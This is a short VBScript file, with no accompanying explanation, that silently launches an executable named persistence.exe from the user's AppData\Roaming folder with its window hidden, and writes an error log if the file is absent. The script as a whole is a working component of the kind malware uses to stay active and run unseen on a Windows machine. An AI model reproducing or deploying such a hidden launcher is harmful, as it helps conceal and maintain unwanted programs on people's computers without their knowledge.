Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the AppData\Roaming folder for the current user
appDataPath = WshShell.ExpandEnvironmentStrings("%APPDATA%")

' Construct the full path to persistence.exe
persistencePath = appDataPath & "\persistence.exe"

' Check if the file exists before trying to run it
If objFSO.FileExists(persistencePath) Then
    ' Run the executable hidden
    WshShell.Run chr(34) & persistencePath & chr(34), 0, False
Else
    ' Optional: Create a log file if the executable is not found
    Set objFile = objFSO.CreateTextFile(appDataPath & "\error_log.txt", True)
    objFile.WriteLine "Error: persistence.exe not found at " & persistencePath
    objFile.Close
End If

Set WshShell = Nothing
Set objFSO = Nothing